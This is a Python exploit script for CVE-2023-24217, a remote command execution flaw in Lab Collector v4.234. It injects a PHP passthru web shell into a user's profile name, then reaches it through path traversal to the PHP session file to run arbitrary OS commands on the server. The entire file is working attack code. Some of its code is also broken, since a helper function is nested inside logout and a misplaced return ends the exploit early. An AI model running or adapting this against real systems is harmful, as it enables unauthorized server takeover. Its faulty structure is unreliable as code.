# Tested on: PHP/MYSQL
# CVE: CVE-2023-24217
# Category: webapps
#
# Lab Collector is a software written in PHP by Agilebio. Version v4.234 allows an authenticated user to execute os commands on the underlying operating system.
#
from argparse import ArgumentParser
from requests import Session
from random import choice
from string import ascii_lowercase, ascii_uppercase, digits
import re
from base64 import b64encode
from urllib.parse import quote_plus

sess: Session = Session()
cookies = {}
headers = {}
state = {}


def random_string(length: int) -> str:
    return "".join(choice(ascii_lowercase + ascii_uppercase + digits) for i in range(length))


def login(base_url: str, username: str, password: str) -> bool:
    data = {"login": username, "pass": password, "Submit": "", "action": "login"}
    headers["Referer"] = f"{base_url}/login.php?%2Findex.php%3Fcontroller%3Duser_profile"
    res = sess.post(f"{base_url}/login.php", data=data, headers=headers)
    if ("My profile" in res.text):
        return res.text
    else:
        return None


def logout(base_url: str) -> bool:
    headers["Referer"] = f"{base_url}//index.php?controller=user_profile&subcontroller=update"
    sess.get(f"{base_url}/login.php?%2Findex.php%3Fcontroller%3Duser_profile%26subcontroller%3Dupdate", headers=headers)

    def extract_field_value(contents, name):
        value = re.findall(f'name="{name}" value="(.*)"', contents)
        if (len(value)):
            return value[0]
        else:
            return ""


def get_profile(html: str):
    return {
        "contact_name": extract_field_value(html, "contact_name"),
        "contact_lab": extract_field_value(html, "contact_lab"),
        "contact_address": extract_field_value(html, "contact_address"),
        "contact_city": extract_field_value(html, "contact_city"),
        "contact_zip": extract_field_value(html, "contact_zip"),
        "contact_country": extract_field_value(html, "contact_country"),
        "contact_tel": extract_field_value(html, "contact_tel"),
        "contact_email": extract_field_value(html, "contact_email")
    }


def update_profile(base_url: str, wrapper: str, param: str, data: dict) -> bool:
    headers["Referer"] = f"{base_url}/index.php?controller=user_profile&subcontroller=update"
    res = sess.post(f"{base_url}/index.php?controller=user_profile&subcontroller=update", data=data, headers=headers)
    return True


def execute_command(base_url: str, wrapper: str, param: str, session_path: str, cmd: str):
    session_file = sess.cookies.get("PHPSESSID")
    headers["Referer"] = f"{base_url}/login.php?%2F"
    page = f"../../../../../..{session_path}/sess_{session_file}"
    res = sess.get(f"{base_url}/extra_modules/eln/index.php?page={page}&action=edit&id=1&{param}={quote_plus(cmd)}",
                   headers=headers)
    return parse_output(res.text, wrapper)


def exploit(args) -> None:
    wrapper = random_string(5)
    param = random_string(3)
    html = login(args.url, args.login_username, args.login_password)
    if (html == None):
        print("unable to login")
    return False
    clean = get_profile(html)
    data = get_profile(html)
    tag = b64encode(wrapper.encode()).decode()
    payload = f"<?php $t=base64_decode('{tag}');echo $t;passthru($_GET['{param}']);echo $t; ?>"
    data["contact_name"] = payload  # inject payload in name field
    if (update_profile(args.url, wrapper, param, data)):
        login(args.url, args.login_username, args.login_password)  # reload the session w/ our payload
    print(execute_command(args.url, wrapper, param, args.sessions, args.cmd))
    update_profile(args.url, wrapper, param, clean)  # revert the profile
    logout(args.url)


def parse_output(contents, wrapper) -> None:
    matches = re.findall(f"{wrapper}(.*)\s{wrapper}", contents, re.MULTILINE | re.DOTALL)
    if (len(matches)):
        return matches[0]
    return None


def main() -> None:
    parser: ArgumentParser = ArgumentParser(description="CVE-2023-24217")
    parser.add_argument("--url", "-u", required=True, help="Base URL for the affected application.")
    parser.add_argument("--login-username", "-lu", required=True, help="Username.")
    parser.add_argument("--login-password", "-lp", required=True, help="Password.")
    parser.add_argument("--cmd", "-c", required=True, help="OS command to execute.")
    parser.add_argument("--sessions", "-s", required=False, default="/var/lib/php/session/",
                        help="The location where php stores session files.")
    args = parser.parse_args()
    if (args.url.endswith("/")):
        args.url = args.url[:-1]
    if (args.sessions.endswith("/")):
        args.sessions = args.sessions[:-1]
    exploit(args)
    pass


if __name__ == "__main__":
    main()
